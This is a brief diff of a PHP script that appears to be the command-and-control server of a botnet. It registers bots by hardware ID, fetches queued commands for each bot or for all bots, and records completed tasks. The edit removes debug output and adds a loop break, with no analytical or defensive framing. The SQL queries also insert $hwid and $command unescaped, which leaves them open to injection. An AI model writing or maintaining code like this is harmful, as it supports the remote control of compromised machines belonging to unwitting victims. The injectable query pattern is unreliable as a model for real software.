@@ -47,7 +47,6 @@ else // if first time connecting add to botlist
 $my_tasks = mysqli_query($conn ,"select * from my_tasks where done = 0 and hwid like '%$hwid%'");
 if(mysqli_num_rows($my_tasks))
 {
-	echo "IF RUNNING<br>";
 	while($row=mysqli_fetch_assoc($my_tasks))
 	{
 		$command = $row['command']; // get the command
@@ -58,7 +57,6 @@ if(mysqli_num_rows($my_tasks))
 }
 else // loop through tasks for all bots
 {
-	echo "ELSE RUNNING<br>";
 	$tasks = mysqli_query($conn,"select * from tasks");
 	while($row=mysqli_fetch_assoc($tasks))
 	{
@@ -86,6 +84,7 @@ else // loop through tasks for all bots
 				// update tasks list to let it know we have completed it
 				mysqli_query($conn,"UPDATE tasks Set complete = '$add' WHERE command = '$command'");			
 				mysqli_query($conn,"INSERT INTO tasks_done (hwid,command) VALUES ('$hwid', '$command');");
+				break;
 			}	
 		}
 
